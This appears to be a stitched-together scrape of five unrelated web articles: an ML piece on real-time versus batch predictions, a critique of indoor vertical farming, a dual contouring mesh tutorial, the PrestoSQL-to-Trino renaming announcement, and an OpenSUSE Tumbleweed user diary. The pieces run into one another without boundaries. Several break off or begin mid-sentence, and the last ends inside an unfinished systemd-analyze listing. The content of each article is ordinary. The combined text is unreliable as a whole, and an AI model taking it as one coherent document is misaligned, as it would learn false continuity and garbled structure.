<p>No matter how great your ML models are, if they take just milliseconds too long to make predictions, users are going to click on something else.</p>

<h4 id="problems_batch_predictions">Problems with batch predictions</h4>
<p>One non-solution is to avoid making predictions online. You can generate predictions in batch offline, store them (e.g. in SQL tables), and pull out pre-computed predictions when needed.</p>

<p>This can work when the input space is finite – you know exactly how many possible inputs to make predictions for. One example is when you need to generate movie recommendations for your users – you know exactly how many users there are. So you predict a set of recommendations for each user periodically, such as every few hours.</p>

<p>To make their user input space finite, many apps make their users choose from categories instead of entering wild queries. For example, if you go to TripAdvisor, you first have to pick a predefined metropolis area instead of being able to enter just any location.</p>

<p>This approach has many limitations. TripAdvisor results are okay within their predefined categories, such as <b>“Restaurants”</b> in <b>“San Francisco”</b>, but are pretty bad when you try to enter wild queries like <b>“high rating Thai restaurants in Hayes Valley”</b>.</p>

</center>

<p>Limitations caused by batch predictions exist even in more technologically progressive companies like Netflix. Say, you’ve been watching a lot of horrors lately, so when you first log into Netflix, horror movies dominate recommendations. But you’re feeling bright today so you search “comedy” and start browsing the comedy category. Netflix should learn and show you more comedy in your list of their recommendations, right? But it can’t update the list until the next time batch recommendations are generated.</p>

<p>In the two examples above, batch predictions lead to decreases in user experience (which is tightly coupled with user engagement/retention), not catastrophic failures. Other examples are ad ranking, Twitter’s trending hashtag ranking, Facebook’s newsfeed ranking, estimating time of arrival, etc.</p>

<p>There are also many applications that, without online predictions, would lead to catastrophic failures or just wouldn’t work. Examples include high frequency trading, autonomous vehicles, voice assistants, unlocking your phones using face/fingerprints, fall detection for elderly care, fraud detection, etc. Being able to detect a fraudulent transaction that happened 3 hours ago is still better than not detecting it at all, but being able to detect it in real-time can prevent it from going through.</p>

<p>Switching from batch predictions to real-time predictions allows you to use dynamic features to make more relevant predictions. Static features are information that changes slowly or rarely – age, gender, job, neighborhood, etc. Dynamic features are features based on what’s happening right now – what you’re watching, what you’ve just liked, etc. Knowing a user’s interests right now will allow your systems to make recommendations much more relevant to them.</p>

<h3 id="online_predictions_solutions">Solutions</h3>
<p>For your system to be able to make online predictions, it has to have two components:</p>

<ol>
  <li>Fast inference: model that can make predictions in the order of milliseconds</li>
  <li>Real-time pipeline: a pipeline that can process data, input it into model, and return a prediction in real-time</li>
</ol>

<h4 id="fast_inference">Fast inference</h4>
<p>When a model is too big and taking too long to make predictions, there are three approaches:</p>

<p><b>1. Make models faster (inference optimization)</b></p>

<p>E.g. fusing operations, distributing computations, memory footprint optimization, writing high performance kernels targeting specific hardwares, etc.</p>

<p><b>2. Make models smaller (model compression)</b></p>

<p>Originally, this family of technique is to make models smaller to make them fit on edge devices. Making models smaller often makes them run faster. The most common, general technique for model compression is quantization, e.g. using 16-bit floats (half precision) or 8-bit integers (fixed-point) instead of 32-bit floats (full precision) to represent your model weights. In the extreme case, some have attempted 1-bit representation (binary weight neural networks), e.g. <a href="https://arxiv.org/abs/1511.00363">BinaryConnect</a> and <a href="https://arxiv.org/abs/1603.05279">Xnor-Net</a>. The authors of Xnor-Net spun off Xnor.ai, a startup focused on model compression which was <a href="https://www.geekwire.com/2020/exclusive-apple-acquires-xnor-ai-edge-ai-spin-paul-allens-ai2-price-200m-range/">acquired by Apple for a reported $200M</a>.</p>

<p>Another popular technique is <a href="https://arxiv.org/abs/1503.02531">knowledge distillation</a> – a small model (student) is trained to mimic a larger model or an ensemble of models (teacher). Even though the student is often trained with a pre-trained teacher, both may also be trained at the same time. One example of a distilled network used in production is <a href="https://arxiv.org/abs/1910.01108"><strong>DistilBERT</strong></a>, which reduces the size of a BERT model by 40%, while retaining 97% of its language understanding capabilities and being 60% faster.</p>

<p>Other techniques include pruning (finding parameters least useful to predictions and setting them to 0) and low-rank factorization (replacing the over-parametric convolution filters with compact blocks to both reduce the number of parameters and increase speed). See <strong><a href="https://arxiv.org/abs/1710.09282">A Survey of Model Compression and Acceleration for Deep Neural Networks</a></strong> (Cheng et al.. 2017) for a detailed analysis.</p>

<p>The number of research papers on model compression is growing. Off-the-shelf utilities are proliferating. Awesome Open Source has a list of <a href="https://awesomeopensource.com/projects/model-compression"><strong>The Top 40 Model Compression Open Source Projects</strong></a>.</p>

<p><b>3. Make hardware faster</b></p>

<p>This is another research area that is booming. Big companies and startups alike are in a race to develop hardware that allows large ML models to do inference, even training, faster both on the cloud and especially on devices. IDC forecasts that by 2020, the combination of edge and mobile devices doing inferencing will <a href="https://www.arm.com/-/media/global/solutions/artificial-intelligence/ai-ml-on-cpu-whitepaper.pdf?revision=17a2b30b-0f5a-4a42-8681-3d9f3f94e513">total 3.7 billion units, with a further 116 million units doing training</a>.</p>

<h4 id="stream_pipeline">Real-time pipeline</h4>
<p>Suppose you have a ride sharing app and want to detect fraudulent transactions e.g. payments using stolen credit cards. When the true credit owner discovers unauthorized payments, they’ll dispute with their bank and you’ll have to refund the charges. To maximize profits, fraudsters might call multiple rides either in succession or from multiple accounts. In 2019, merchants estimate fraudulent transactions account for an average of <a href="https://network.americanexpress.com/globalnetwork/dam/jcr:09c34553-b4a2-43ca-bf3e-47cbc911ea51/American%20Express%202019%20Digital%20Payments%20Survey_Insights%20Paper.pdf">27% of their annual online sales</a>. The longer it takes for you to detect the stolen credit card, the more money you’ll lose.</p>

<p>To detect whether a transaction is fraudulent, looking at that transaction alone isn’t enough. You need to at least look into the recent history of the user involved in that transaction, their recent trips and activities in-app, the credit card’s recent transactions, and other transactions happening around the same time.</p>

<p>To quickly access these types of information, you want to keep as much of them in-memory as possible. Every time an event you care about happens – a user choosing a location, booking a trip, contacting a driver, canceling a trip, adding a credit card, removing a credit card, etc. – information about that event goes into your in-memory storage. It stays there for as long as they are useful (usually in order of days) then either goes into permanent storage (e.g. S3) or is discarded. The most common tool for this is <a href="https://github.com/apache/kafka">Apache Kafka</a>, with alternatives such as Amazon Kinesis. Kafka is a stream storage: it stores data as it streams.</p>

<p>Streaming data is different from static data – data that already exists somewhere in its entirety, such as CSV files. When reading from CSV files, you know when the job is finished. Streams of data never finish.</p>

<p>Once you’ve had a way to manage streaming data, you want to extract features to input into your ML models. On top of features from streaming data, you might also need features from static data (when was this account created, what’s the user’s rating, etc.). You need a tool that allows you to process streaming data as well as static data and join …</p></div></div>

These systems glow with a fantastic magenta light — from LEDs that are specially tuned to provide optimal light for photosynthesis — often with stacked trays of plants, one on top of the other. Some of this technology is new, especially the LEDs, although pot growers have used tools like this for years.</p><p id="db29">Some of the more notable efforts to build indoor “farms” include <a href="http://www.freightfarms.com/" rel="noopener">Freight Farms</a> in Boston. And there is a group at MIT that is trying to create new high-tech platforms for growing food inside, including “<a href="http://openag.media.mit.edu/hardware/" rel="noopener">food computers</a>”. These folks are very smart, and have done a lot to perfect the technology.</p><p id="47bb">At first blush, these “farms” sound great. Why not <em>completely</em> eliminate food miles, and grow food right next to restaurants, cafeterias, or supermarkets? And why not grow crops inside closed systems, where water can be recycled, and pests can (in theory) be managed without chemicals.</p><p id="d5c4">It sounds great, doesn’t it? But there are many challenges.</p></div></div></section><section><div><div><p id="6ba8"><span>F</span><strong>irst, Vertical Farms Cost a Fortune</strong></p><p id="5f2b">But there are costs to these farms. <em>Huge</em> costs.</p><p id="f0bc">First, these systems are <em>really</em> expensive to build. The shipping container systems developed by <a href="http://www.freightfarms.com/faq/" rel="noopener">Freight Farms</a>, for example, cost between $82,000 and $85,000 <em>per container</em> — an astonishing sum for a box that just grows greens and herbs. Just one container costs as much as 10 entire acres of prime American farmland — which is a far better investment, both in terms of food production and future economic value. Just remember: farmland has the benefit of generally <em>appreciating</em> in <a href="http://www.forbes.com/sites/joshuarogers/2014/09/23/dirt-cheap-investors-are-plowing-into-farmland-heres-why" rel="noopener">value over time</a>, whereas a big metal box is likely to only decrease in value.</p><p id="24cf">Second, food produced this way is <em>very</em> expensive. For example, the Wall Street Journal <a href="http://www.wsj.com/articles/are-shipping-containers-the-future-of-farming-1465393797" rel="noopener">reports</a> that mini-lettuces grown by Green Line Growers costs more than <em>twice</em> as much as organic lettuce available in most stores. And this is typical for other indoor growers around the country: it’s very, very expensive, even compared to organic food. Instead of making food <em>more</em>available, especially to poorer families on limited budgets, these indoor crops are only available to the affluent. It might be fine for gourmet lettuce, or fancy greens for expensive restaurants, but regular folks may find it out of reach.</p><p id="e121">Finally, indoor farms use <em>a lot</em> of energy and materials to operate. The container farms from Freight Farms, for example, use about <a href="http://www.freightfarms.com/faq/" rel="noopener">80 kilowatt-hours of electricity a day</a> to power the lights and pumps. That’s nearly 2–3 times as much electricity as a typical (and still very inefficient) American home, or about 8 times the electricity used by an average San Francisco apartment. And on the average American electrical grid, this translates to emitting <em>44,000 pounds of CO2 per container per year</em>, from electricity alone, not counting any additional heating costs. This is <em>vastly</em> more than the emissions it would take to ship the food from someplace else.</p><p id="0e49">And none of it is necessary.</p></div></div></section><section><div><div><p id="1017"><span>B</span><strong>ut, Wait, Can’t Indoor Farms Use Renewable Energy?</strong></p><p id="5bbd">Proponents of indoor techno-farms often say that they can offset the enormous sums of electricity they use, by powering them with renewable energy — especially solar panels — to make the whole thing carbon neutral.</p><p id="5b5d">But just stop and think about this for a second.</p><p id="5f6a">These indoor “farms” would use solar panels to harvest naturally occurring sunlight, and convert it into electricity, so that they can power…<em>artificial sunlight</em>? In other words<em>, </em>they’re<em> trying to use the sun to replace the sun.</em></p><p id="0a0f">But we don’t need to replace the sun. Of all of the things we should worry about in agriculture, the availability of free sunlight is not one of them. Any system that seeks to replace the sun to grow food is probably a bad idea.</p></div></div></section><section><div><div><p id="e3d3"><span>B</span><strong>esides, “Food Miles” Aren’t a Big Climate Problem</strong></p><p id="29a5">Sometimes we hear that vertical farms help the environment by reducing “food miles” — the distance food items travel from farm to table — and thereby reduce fuel consumption and greenhouse gas emissions.</p><p id="0f7a">This sounds logical, but it turns out to be a red herring.</p><p id="c2ec">Strange as it might seem, local food typically uses about the same amount of energy — per pound — to transport as food grown far away. Why? Short answer: volume and method of transport. A larger food operator can ship food more efficiently — even if it travels longer distances — because of the gigantic volumes they work in. Plus, ships, trains, and even large trucks driving on Interstate highways use less fuel, per pound per mile, than small trucks driving around town.</p><p id="a654">Plus it turns out that “food miles” aren’t a very big source of CO2 emissions anyway, whether they’re local or not. In fact, they pale in comparison to emissions from deforestation, methane from cattle and rice fields, and nitrous oxide from over-fertilized fields. And local food systems — especially organic farms that use fewer fertilizers, and grass fed beef that sequesters carbon in the soil — can reduce these more critical emissions. At the end of the day, local food systems are generally better for the environment, including greenhouse gas emissions. Just don’t worry about emissions from food miles too much.</p></div></div></section><section><div><div><p id="6153"><span>A</span><strong>nd These Vertical “Farms” Can’t Grow Much</strong></p><p id="1ac1">A further problem with indoor farms is that a lot of crops could never develop properly in these artificial conditions. While LED lights provide the light needed for <em>photosynthesis</em> to occur, they don’t provide the proper mix of light and heat to trigger plant development stages — like those that tell plants when to put on fruit or seed. Moreover, a lot of crops need a bit of wind to develop tall, strong stalks, needed later when they are carrying heavy loads before harvest. As a result, indoor farms are severely limited, and have a hard time growing things besides simple greens.</p><p id="71b1">Indoor farms might be able to provide some <em>garnish</em> and <em>salads</em> to the world, but forget about them as a means of growing much other <em>food</em>.</p></div></div></section><section><div><div><p id="003c"><strong>A Better Way?</strong></p><p id="bf8f">I’m not the only critic of indoor, high-tech, energy-intensive agriculture. Other authors are starting to point out the problems with these systems too (read very good critiques <a href="http://www.salon.com/2016/02/17/enough_with_the_vertical_farming_partner/" rel="noopener">here</a>, <a href="http://www.counterpunch.org/2012/12/11/the-vertical-farming-scam/" rel="noopener">here</a>, <a href="https://www.theguardian.com/sustainable-business/2015/apr/10/indoor-farming-makes-no-economic-environmental-sense" rel="noopener">here</a>, and <a href="http://news.cornell.edu/stories/2014/02/indoor-urban-farms-called-wasteful-pie-sky" rel="noopener">here</a>).</p><p id="02f4">While I appreciate the enthusiasm and innovation put into developing indoor farms, I think these efforts are, at the end of the day, counterproductive.</p><p id="8dea">Instead, I think we should use the same investment of dollars, incredible technology, and amazing brains to solve other agricultural problems — like developing new methods for drip irrigation, better grazing systems that lock up soil carbon, and ways of recycling on-farm nutrients. Organic farming and high-precision agriculture are doing promising things, and need more help. We also need innovation and capital to help other parts of the food system, especially in tackling food waste, and getting people to shift their diets towards more sustainable directions.</p><p id="9534">An interconnected network of good farms —real farms that provide nutritious food, with social and environmental benefits to their communities — is the kind of innovation we really need.</p></div></div></section><section><div><p id="b135">NOTE: parts of this piece were adapted from an earlier blog article of mine called <em>“Local Food is Great, But Can It Go Too Far?”</em></p></div></section><section><div><div><p id="68aa"><em>Dr. </em><a href="http://globalecoguy.org/" rel="noopener"><em>Jonathan Foley</em></a><em> (@</em><a href="http://twitter.com/@globalecoguy" rel="noopener"><em>GlobalEcoGuy</em></a><em>) is a climate &amp; environmental scientist, writer, and speaker.

		<p><em>How to create a sharp mesh from a function without even trying</em></p>
<p>In <a href="https://www.boristhebrave.com/2018/04/15/marching-cubes-tutorial/">part 1</a> and <a href="https://www.boristhebrave.com/2018/04/15/marching-cubes-3d-tutorial/">part 2</a> of the series, we looked at the Marching Cubes algorithm, and how it can turn any function into a grid based mesh. In this article we’ll look at some of the shortcomings and how we can do better.</p>
<div><!-- Font Awesome -->
<p>
Marching Cubes is easy to implement, and therefore ubiquitous. But it has a number of problems:</p></div>
<ol>
<li>
<p>Complexity</p>
<p>Even though you only need process one cube at a time, Marching Cubes ends up pretty complicated as there are a lot of different possible cases to consider.</p>
<figure>
    <img src="https://www.boristhebrave.com/content/2018/04/mc_18_cases_small.png"><br>
</figure>
</li><li>
<p>Ambiguity</p>
<p>Some cases in Marching Cubes cannot be obviously resolved one way or another. In 2d, if you have two opposing corners, it’s impossible to say if they are meant to be joined or not.</p>
<figure>
    <img src="https://www.boristhebrave.com/content/2018/04/mc_ambig.svg" alt="Figure 4"><br>
</figure>
<p>In 3d, the problem is even worse, as inconsistent choices can leave you with a leaky mesh. We had to write extra code to deal with that in <a href="https://www.boristhebrave.com/2018/04/15/marching-cubes-3d-tutorial/">part 2</a>.</p>
</li><li>
Marching Cubes cannot do sharp edges and corners
<p>Here’s a square approximated with Marching Cubes.</p>
<figure>
    <img src="https://www.boristhebrave.com/content/2018/04/mc_square.svg" alt="Figure 5"><br>
</figure>
<p>The corners have been sliced off. Adaptivity cannot help here – Marching Squares always creates straight lines on the interior of any cell, which is where the target square corner happens to lie.
</p></li></ol>
<p>So, what do do next?</p>

<h2>Enter Dual Contouring</h2>
<p><strong>Brevity Alert:</strong> This tutorial covers concepts and ideas more than methods and code. If you are more interested in the implementation, make sure you check out the python implementation (<a href="https://github.com/BorisTheBrave/mc-dc/blob/a165b326849d8814fb03c963ad33a9faf6cc6dea/dual_contour_2d.py">2d&nbsp;<span></span></a>, <a href="https://github.com/BorisTheBrave/mc-dc/blob/a165b326849d8814fb03c963ad33a9faf6cc6dea/dual_contour_3d.py">3d&nbsp;<span></span></a>), which contains commented example code with all the nitty gritty.</p>
<p>Dual Contouring solves these problems, and is more extensible to boot. The trade off is we need to know even more information about \( f(x) \), the function determining what is solid and what is not. Not only do we need to know the value of \( f(x) \), we also need to know the gradient \( f'(x) \). That extra information will improve the adaptivity from marching cubes.</p>
<p>Dual Contouring works by placing a single vertex in each cell, and then “joining the dots” to form the full mesh. Dots are joined across every edge that has a sign change, just like in marching cubes.</p>
<figure>
    <img src="https://www.boristhebrave.com/content/2018/04/dc_tee_comparison.svg"><br>
</figure>
<p><strong>Aside:</strong><br>
The “dual” in the name comes from the fact that cells in the grid becomes vertices in the mesh, which relates to the <a href="https://en.wikipedia.org/wiki/Dual_graph"><strong>dual graph</strong></a>
</p>
<p>Unlike Marching Cubes, we cannot evaluate cells independently. We must consider adjacent ones to “join the dots” and find the full mesh. But in fact, it’s a lot <a href="https://github.com/BorisTheBrave/mc-dc/blob/a165b326849d8814fb03c963ad33a9faf6cc6dea/dual_contour_3d.py#L57">simpler algorithm&nbsp;<span></span></a> than Marching Cubes because there are not a lot of distinct cases. You simply find every edge with a sign change, and connect the vertices for the cells adjacent to that edge.</p>
<h2>Getting the gradient</h2>
<p>In our simple example of a 2d circle of radius 2.5, \( f \) is defined as:</p>
<p>\[ f(x, y) = 2.5 – \sqrt{x^2 + y^2} \]</p>
<p>(in other words, 2.5 minus the distance from the origin)</p>
<p>With a bit of calculus, we can compute the gradient:</p>
<p>\[ f'(x, y) = \text{Vec2}\left(\frac{-x}{\sqrt{x^2 + y^2}}, \frac{-y}{\sqrt{x^2 + y^2}} \right) \]</p>
<p>The gradient is pair of numbers for every point, indicating how much the function changes when moving along the x-axis or y-axis.</p>
<p>But you don’t need complicated maths to get the gradient function. You can just measure the change in \( f \) when \( x \) and \( y \) are perturbed by a small amount \( d \).</p>
<p>\[ f'(x, y) \approx \text{Vec2}\left(\frac{f(x+d, y) – f(x-d, y)}{2d}, \frac{f(x, y+d) – f(x, y-d)}{2d} \right) \]</p>
<p>This works for any sufficiently smooth \( f \), providing you pick \( d \) small enough. In practice, even functions with sharp points are sufficiently smooth, as you don’t need evaluate the gradient near the sharp parts for it to work. <a href="https://github.com/BorisTheBrave/mc-dc/blob/a165b326849d8814fb03c963ad33a9faf6cc6dea/dual_contour_2d.py#L95">Link to code <span></span></a>.</p>
<h2>Adaptivity</h2>
<p>So far, we’ve just got the same sort of stepped look that Marching Cubes had. We need to add some adaptivity. For Marching Cubes, we chose where along the edge put a vertex. Now we have a free choice of anywhere in the interior of the cell.</p>
<p>We want to choose the point that is most consistent with the information provided to us, i.e. the evaluation of \( f(x) \) and its gradient. Note that we’ve sampled the gradient along the edges, not at the corners.</p>
<figure>
    <img src="https://www.boristhebrave.com/content/2018/04/dc_example_single.svg"><br>
</figure>
<p>By picking the illustrated point, we ensure that the output faces from this cell conform as well as possible to the normals:</p>
<figure>
    <img src="https://www.boristhebrave.com/content/2018/04/dc_example.svg"><br>
</figure>
<p>In practice, not all the normals around the cell are going to agree. We need to pick the point of best fit. I discuss how to handle picking that point in a <a href="#picking">later section</a>.</p>
<h2>Going 3d</h2>
<p>The 2d and 3d cases aren’t really that different. A cell is now a cube, not a square. And we are outputting faces, not edges. But that’s it. The routine for picking a single point per cell is the same. And we still find edges with a sign change, and then connect the points of adjacent cells, but now that is 4 cells, giving us a 4-sided polygon:</p>
<figure>
    <img src="https://www.boristhebrave.com/content/2018/04/dc_single_face.png"><figcaption>The face associated with a single edge. It has a point in every adjacent cell.</figcaption></figure>
<h2>Results</h2>
<p>Dual contouring has a more natural look and flow to it than marching cubes, as you can see in this sphere constructed with it:</p>

<figure id="render_container"></figure>

<p>In 3d, this procedure is robust enough to pick points running along the edge of a sharp feature, and to pick out corners where they occur.</p>
<figure>

    </a><br>
</figure>

<h2>Choosing a vertex location</h2>
<p>One major problem I glossed over before is how to choose the point location when the normals don’t point to a consistent location.</p>
<figure>
    <img src="https://www.boristhebrave.com/content/2018/04/dc_inconsistent.png"><br>
</figure>
<p>The problem is even worse in 3d when there are likely to be a lot of normals.</p>
<p>The way to solve this is to pick the point that is mutually the best for all the normals.</p>
<p>First, for each normal, we assign a penalty to locations further away from ideal. Then we sum up all the penalty functions, which will give an ellipse shaped penalty. Finally, we pick the point with the lowest penalty.</p>
<figure>
    <img src="https://www.boristhebrave.com/content/2018/04/dc_valley.png"><br>
</figure>
<p>Mathematically, the individual penalty functions are the square of the distance from the ideal line for that normal. The sum of all those squared terms is a <a href="https://en.wikipedia.org/wiki/Quadratic_function">quadratic function</a>, so the total penalty function is called the <strong>QEF</strong> (quadratic error function). Finding the minimal point of a quadratic function is a standard routine available in most matrix libraries.<br>
In my <a href="https://github.com/BorisTheBrave/mc-dc/blob/a165b326849d8814fb03c963ad33a9faf6cc6dea/qef.py#L57">python implementation <span></span></a>, I use <a href="https://docs.scipy.org/doc/numpy-1.14.0/reference/generated/numpy.linalg.lstsq.html">numpy’s lstsq</a> function.</p>
<h2>Problems</h2>
<h3>Colinear normals</h3>
<p>Most tutorials would stop here but it’s a dirty secret that solving the QEF as described in the original Dual Contouring paper doesn’t actually work very well.</p>
<p>If you solve the QEF, you can find the point that is most consistent with the normals of the function. But there’s <strong>no actual guarantee that the resulting point is inside the cell</strong>.</p>
<p>In fact, it’s quite common for it not to be if you have large flat surfaces. In that case all the sampled normals are the same or very close, as in this diagram.</p>
<figure>
    <img src="https://www.boristhebrave.com/content/2018/04/dc_colinear.svg"><br>
</figure>
<p>I’ve seen a lot of advice dealing with this particular problem. Several people have given up on using the gradient information, instead taking the center of the cell, or average of the boundary positions. This is called Surface Nets, and it at least has simplicity going for it.</p>
<p>But what I’d recommend based on my own experiments is the combination of two techniques.</p>
<h4>Technique 1: Constrained QEF solving</h4>
<p>Recall we were finding the cell point by finding the point that minimized the value of a given function, called the QEF. With some small changes, we can find the minimizing point <em>within</em> the cell.</p>
<h4>Technique 2: Biasing the QEF</h4>
<p>We can add any quadratic function  we like to the QEF and we get another quadratic function which is still solvable. So I add a quadratic which has a minimal point in the center of the cell.<br>
This has the effect of pulling the solution of the overall QEF towards the center.<br>
In fact, it has a stronger effect when the normals are colinear and likely to give screwy results, while it barely affects the positions for the good case.</p>
<p>Using both techniques is somewhat redundant, but I think it gives the best visual results.</p>
<p>Better details on both techniques are demonstrated <a href="https://github.com/BorisTheBrave/mc-dc/blob/a165b326849d8814fb03c963ad33a9faf6cc6dea/qef.py#L87">in the code <span></span></a>.</p>
<h3>Self interesctions</h3>
<p>Another dual contouring annoyance is it can sometimes generate a 3d surface that intersects itself. For most uses, this is completely ignorable, so I have not addressed it.</p>
<p>There is a paper discussing how to deal with it: <a href="http://www.cs.wustl.edu/~taoju/research/interfree_paper_final.pdf">“Intersection-free Contouring on An Octree Grid” Ju and Udeshi 2006</a></p>
<h3>Manifolds</h3>
<p>While a dual contouring mesh is always water tight, it’s not always a well defined surface. As there’s only one point per cell, if two surfaces pass through a cell, they will share it. This is called a “non-manifold” mesh, and it can mess with some texturing algorithms. This issue is common if you have solids that are thinner than the cell size, or multiple objects nearly touching each other.</p>
<figure>
    <img src="https://www.boristhebrave.com/content/2018/04/dc_nonmanifold.svg"><br>
</figure>
<p>Handling these cases is a substantial extension on basic Dual Contouring. If you need this feature I recommend having a look at <a href="https://github.com/Lin20/isosurface">this Dual Contouring implementation</a> or <a href="http://faculty.cs.tamu.edu/schaefer/research/dualsimp_tvcg.pdf">this paper</a></p>
<h2>Extensions</h2>
<p>Because of the relative simplicity of the meshing process, Dual Contouring is much easier to extend to cell layouts other than the standard grid used above. Most commonly, you can run it on an <a href="https://en.wikipedia.org/wiki/Octree">octtree</a> to have varying sizes of cells precisely where you need the detail. The rough idea is identical – pick a point per cell using sampled normals, then for each edge showing a sign change find the adjacent 4 cells and combine their vertices into a face. With an octree, you can recurse to find those edges, and the adjacent cells. Matt Keeter has a <a href="https://www.mattkeeter.com/projects/contours/">detailed tutorial</a> on what to do.</p>
<p>Another neat extension is that all you need for Dual Contouring is a measure of what is inside / outside, and corresponding normals. Though I’ve assumed you have a function for this, you can also derive the same information from another mesh. This allows you to “remesh”, i.e. generate a clean set of vertices and faces that cleans up the original mesh. For example, Blender’s <a href="https://docs.blender.org/manual/de/dev/modeling/modifiers/generate/remesh.html">remesh modifier</a>.</p>
<p>Well, that’s all I’ve got time for. Let me know in the comments if you found it useful, or if there’s anything else you’d like me to explain.</p>

    <p>We’re rebranding PrestoSQL as Trino. The software and the community you have come to love and depend on aren’t 
going anywhere, we are simply renaming. <strong>Trino is the new name for PrestoSQL</strong>, the project supported by the founders 
and creators of Presto® along with the major contributors – just under a shiny new name. And now you can find us here:</p>

<ul>
  <li>GitHub: <a href="https://github.com/trinodb/trino">https://github.com/trinodb/trino</a>. Please give it a <a href="https://github.com/trinodb/trino/blob/master/.github/star.png">star</a>!</li>

  <li>Slack: <a href="https://trino.io/slack.html">https://trino.io/slack.html</a></li>
</ul>

<p>If you want to learn why we’re doing this, read on…</p>

<!--more-->

<p>In 2012, Dain, David and Martin joined the Facebook data infrastructure team. Together with Eric Hwang, we created 
Presto® to address the problems of low latency interactive analytics over Facebook’s massive Hadoop data warehouse. 
One of our non-negotiable conditions was for Presto® to be an open source project. Open source is in our DNA - we had 
all used and participated in open source projects to various degrees in the past, and we recognized the power of open 
communities and developers coming together to build successful software that can stand the test of time.</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/team.jpg" alt=""></p>

<p>Over the next six years, we worked hard to build a healthy open source community and ecosystem around the project. We 
worked with developers and users all over the world and welcomed them into the Presto® community. Presto® was on a path 
of increasing growth and success, in large part because of the contributions from developers across many fields and all 
over the world.</p>

<p>Unfortunately in 2018, it became clear that Facebook management wanted to have tighter control over the project and its 
future. This culminated with their decision to grant Facebook developers commit rights on the project without any prior 
experience in Presto®. We strongly believe that this kind of decision is not compatible with having a healthy, open 
community. Moreover, they made this decision by fiat without engaging the Presto® community. As a matter of principle, 
we had no choice but to leave Facebook in order to focus on making sure Presto® continued to be a successful project 
with an open, collaborative and independent community. In reality, the choice was easy.</p>

<p>We started the Presto Software Foundation in January 2019 as an independent entity to oversee the development of the 
software and community, continuing the meritocratic system that had been in place over the previous 6 years. The community 
quickly consolidated under this new home. We intentionally stayed unemployed over the next 10 months to focus on expanding 
and strengthening the community by working directly with major users and contributors, as well as reaching out to a wider 
group of users and developers across the globe. This resulted in new use cases and an injection of energy, making the 
project more vibrant than ever before as even more new users and developers became engaged. But, don’t take our word for 
it, let the data speak for itself:</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/commits.png" alt=""></p>

<p>Months after this consolidation, Facebook decided to create a competing community using The Linux Foundation®. As a first 
action, Facebook applied for a trademark on Presto®. This was a surprising, norm-breaking move because up until that point, 
the Presto® name had been used without constraints by commercial and non-commercial products for over 6 years. In September 
of 2019, Facebook established the Presto Foundation at The Linux Foundation®, and immediately began working to enforce this 
new trademark. We spent the better part of the last year trying to agree to terms with Facebook and The Linux Foundation 
that would not negatively impact the community, but unfortunately we were unable to do so. The end result is that we must 
now change the name in a short period of time, with little ability to minimize user disruption.</p>

<p>On a personal note, and as the founders who named the project Presto® in the first place, this is an incredibly sad and 
disappointing turn of events. And while we will always have fondness for the name Presto®, we have come to accept that a 
name is just a name. To be frank, we’re tired of this endless distraction, and we intend to focus on what matters most 
and what we are best at doing – building high quality software everyone can rely on and fostering a healthy community 
of users and developers that build it and support it. We’re not going anywhere – we’re the same people, the same amazing 
software, under a new name: Trino.</p>

<p><strong>If you love this project, you already love Trino. ❤️</strong></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>As noted few days ago, I decided to give OpenSUSE another chance. This time, for at least a month, and then give it my final judgement. I’ll likely write about motivation for going on this journey down the road, but for now, this is update on what has been weird for me on OpenSUSE side of things and the things that got on my nerves in this past few days.</p>



<p>In previous article I didn’t mention that in fact I went for the OpenSUSE Tumbleweed with KDE Plasma desktop. Consequently in this article you might notice that some issues are OpenSUSE annoyances, while others are KDE ones. I’ll try to elaborate each point as I go along and it should be pretty clear which one is which. </p>



<h2>KDE Wallet</h2>



<p>After the first login, when connecting to a WiFi, I got prompted to set up KDE Wallet. Default selection would suggest I should use GPG based encryption, but instead of going through some preliminary configuration (getting my Yubikey setup etc.) I decided to go for a blowfish based encryption. </p>



<p>I entered the same password I use for my user login in the KDE Wallet setup process in hope that Wallet will be automatically unlocked at login.</p>



<p>Unfortunately, next time I rebooted the machine, system prompted me for the Wallet password. Very user friendly… NOT! </p>



<p>After short investigation I noticed that package required for that functionality is not installed by default, so I promptly solved that</p>



<pre><code>sudo zypper in pam_kwallet</code></pre>



<p>This made everything work as expected, but it puzzles me why this is not provided by default. If I’m not mistaken, Arch pulls pam_kwalletd by default, as a dependency of KDE Wallet package, so let’s say OpenSUSE could try to be a bit more user-friendly in that regard.</p>



<h2>WiFi connection time</h2>



<p>While on the topic of WiFi I’ve observed one peculiar thing; that even after setting up pam_kwallet, WiFi connection took some time for initial handshake. After each boot, or resume from sleep, I would say it takes around 10 seconds for WiFi connection to be re-established. </p>



<p>Perhaps I am a bit too spoiled by the Fedora’s lightning speed. And perhaps this is KDE doing something weird. But both GNOME and KDE use NetworkManager underneath, so I guess there should theoretically be no difference between OpenSUSE KDE and Fedora GNOME, but that’s just in theory.</p>



<p><strong>Update</strong> – 2020-12-28: I tried to enable the option called “All users may connect to this network” in network settings in hope that will speed up (connect to wifi before the login), but unfortunately issue persists. </p>



<h2>Disk encryption</h2>



<p>As any sensible person, carrying laptop around in my backpack, I encrypt my whole disk using LUKS. Just in case device gets stolen or lost or whatever.</p>



<p>Due to the way how OpenSUSE has decided to implement the encryption on EFI based systems, each time I boot the system, I get prompted for a password… twice… </p>



<p>This is easily solve-able and is even described in <a rel="noreferrer noopener" href="https://en.opensuse.org/SDB:Encrypted_root_file_system" data-type="URL" data-id="https://en.opensuse.org/SDB:Encrypted_root_file_system" target="_blank">OpenSUSE Wiki article</a>. </p>



<p>Regardless, first one prompted by EFI is ugly as hell, while the second one is the nice one. Not sure how Fedora does it but I am used to their “flickerless boot” so much that I consider everything else “an regression”.</p>



<h2>Boot speed</h2>



<p>Oh, and also, that decryption process seems to be quite slow on my Ryzen CPU based laptop for some reason. I would bet it takes more than shown in the following excerpt from <code>systemd-analyze</code>. But that may just be an “perceived slowness” or something like that.</p>



<pre><code>ivan@swift3:~&gt; systemd-analyze blame | head -5
7.367s dracut-initqueue.service

<p>As you can see, almost 15 second is spent in that initial phase, and I’d bet it takes another 20 or so after entering my password in EFI prompt. Anyhow, analyze command still shows quite concerning numbers on a laptop that boots other distributions (Arch, Fedora, Ubuntu…) in few seconds</p>



<pre><code>Startup finished in 5.125s (firmware) + 30.053s (loader) + 1.752s (kernel) + 9.070s (initrd) + 2.130s (userspace) = 48.132s 
graphical.target reached after 2.121s in userspace
</code></pre>



